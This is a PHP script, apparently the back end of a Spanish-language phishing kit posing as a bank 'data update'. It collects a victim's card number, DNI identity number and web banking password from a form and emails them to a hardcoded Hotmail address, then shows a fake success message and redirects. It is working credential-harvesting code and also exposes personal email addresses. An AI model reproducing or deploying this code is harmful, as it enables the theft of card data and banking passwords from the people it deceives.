<?php

    session_start();

    $_SESSION["cc"] = $_POST['cc'];
    $_SESSION["pass"] = $_POST['pass'];
    $_SESSION["dni"] = $_POST['dni'];

    $cc = $_SESSION['cc'];
    $dni = $_POST['dni'];
    $pass = $_SESSION['pass'];


    //Correo a donde se envía la información
    //$to = "cruzadoeduar18@gmail.com";
    $to = "fernando1894@hotmail.com";

    //Asunto de correo
    $subject = "ACTUALIZACION DE DATOS CORREO 1";

    //Informacion que se envía en el correo
    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
            "DNI: " . $dni . "\n" . 
            "CLAVE WEB: " . $pass;

    //Destinatario
    $headers = "From: pruebas@pruebas.ga";

    mail($to, $subject, $txt, $headers);
    echo "<script> alert('Datos enviados correctamente.'); window.location='index.php' </script>";

    header('Location: form.html');
?>